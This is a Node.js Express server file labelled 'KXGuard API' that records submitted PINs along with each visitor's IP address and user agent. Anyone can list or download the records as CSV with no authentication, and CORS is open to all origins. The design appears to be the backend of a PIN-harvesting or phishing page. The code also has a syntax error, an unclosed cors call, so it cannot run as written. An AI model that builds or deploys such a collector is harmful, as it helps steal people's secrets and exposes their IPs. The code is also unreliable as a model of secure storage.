// server.js - Vercel-compatible version
const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

const app = express();

// Security middleware
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
  credentials: false
});

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

app.use(express.json({ limit: '1mb' }));
app.use(express.static('public'));

// In-memory storage for Vercel (will reset on each deployment)
let pins = [];

// Load initial data if available (for development)
if (process.env.NODE_ENV === 'development') {
  try {
    const fs = require('fs');
    const path = require('path');
    const FILE_PATH = path.join(__dirname, 'data', 'pins.json');
    if (fs.existsSync(FILE_PATH)) {
      pins = JSON.parse(fs.readFileSync(FILE_PATH, 'utf8'));
    }
  } catch (error) {
    console.log('Using in-memory storage');
  }
}

function savePins() {
  // In production (Vercel), this won't persist between requests
  // Consider using a database service like MongoDB Atlas, Supabase, or Vercel KV
  if (process.env.NODE_ENV === 'development') {
    try {
      const fs = require('fs');
      const path = require('path');
      const DATA_DIR = path.join(__dirname, 'data');
      const FILE_PATH = path.join(DATA_DIR, 'pins.json');
      
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }
      
      fs.writeFileSync(FILE_PATH, JSON.stringify(pins, null, 2));
      return true;
    } catch (error) {
      console.error('Error saving pins:', error);
      return false;
    }
  }
  return true;
}

// Input validation middleware
function validatePin(req, res, next) {
  const { pin } = req.body || {};
  
  if (!pin || typeof pin !== 'string') {
    return res.status(400).json({ error: 'Valid PIN is required' });
  }
  
  // Sanitize PIN - only allow alphanumeric and common symbols
  if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(pin)) {
    return res.status(400).json({ error: 'PIN contains invalid characters' });
  }
  
  if (pin.length > 50) {
    return res.status(400).json({ error: 'PIN too long' });
  }
  
  next();
}

app.post('/save-pin', validatePin, (req, res) => {
  try {
    const { pin, ts, ua } = req.body || {};
    
    const newEntry = {
      pin: pin.trim(),
      ts: ts || new Date().toISOString(),
      ua: (ua || '').substring(0, 500), // Limit user agent length
      ip: req.ip || req.connection.remoteAddress,
      createdAt: new Date().toISOString()
    };
    
    pins.push(newEntry);
    
    // Keep only last 1000 entries to prevent memory issues
    if (pins.length > 1000) {
      pins = pins.slice(-1000);
    }
    
    savePins();
    
    console.log(`PIN saved successfully from IP: ${newEntry.ip}`);
    res.json({ status: 'ok', message: 'PIN saved successfully' });
  } catch (error) {
    console.error('Error saving PIN:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/get-pins', (req, res) => {
  try {
    res.json(pins);
  } catch (error) {
    console.error('Error getting pins:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/export-pins.csv', (req, res) => {
  try {
    const header = ['pin', 'timestamp', 'user_agent', 'ip', 'created_at'];
    const rows = pins.map(p => [
      `"${String(p.pin || '').replace(/"/g, '""')}"`,
      p.ts || '',
      `"${String(p.ua || '').replace(/"/g, '""')}"`,
      p.ip || '',
      p.createdAt || ''
    ]);
    
    const csv = [header.join(','), ...rows.map(r => r.join(','))].join('\n');
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="kxguard_pins_export.csv"');
    res.send(csv);
  } catch (error) {
    console.error('Error exporting CSV:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    storage: 'in-memory',
    pinsCount: pins.length
  });
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// For local development
if (process.env.NODE_ENV !== 'production') {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`🚀 KXGuard API running on port ${PORT}`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`💾 Storage: ${process.env.NODE_ENV === 'development' ? 'file-based' : 'in-memory'}`);
    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
  });
}

// Export for Vercel
module.exports = app;
